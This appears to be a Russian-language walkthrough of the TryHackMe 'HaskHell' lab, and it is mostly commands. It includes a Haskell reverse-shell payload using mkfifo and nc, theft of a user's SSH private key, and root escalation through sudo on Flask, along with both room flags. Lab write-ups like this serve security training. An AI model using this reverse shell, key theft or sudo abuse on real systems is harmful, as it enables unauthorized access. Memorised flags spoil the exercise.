[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [HaskHell](https://tryhackme.com/r/room/haskhell) 

Всего 1 заданиe:
## Задание 1
Покажите своему профессору, что его докторская степень не находится под охраной.

Пожалуйста, отправляйте комментарии/опасения/письма с ненавистью на адрес @passthehashbrwn в Twitter.

### Ответьте на вопросы ниже
Получите флаг в файле user.txt.

```commandline
sudo nmap -sSCV <IP>
http://<IP>:5001/submit

#!/usr/bin/env runhaskhell
module Main where
import System.Process
main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f"


nc -nlvp 4444
whoami
id
ls -la /home
cd /home/prof/.ssh/
ls -la
which python3
python3 -m http.server
wget http://<IP>:8000/id_rsa

chmod 600 id_rsa
ssh -i id_rsa prof@<IP>
cat /home/prof/user.txt
```
```commandline
flag{academic_dishonesty}
```
Получите флаг в root.txt
```commandline
SHELL=/bin/bash script -q /dev/null
sudo -l
ls -l /usr/bin/flask
file /usr/bin/flask
cat /usr/bin/flask
python3 /usr/bin/flask


cat > shell.py << EOF
> #!/usr/bin/env python3
> import pty
> pty.spawn("/bin/bash")
> EOF

export FLASK_APP=shell.py
sudo /usr/bin/flask run
whoami
cat /root/root.txt
```

```commandline
flag{im_purely_functional}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)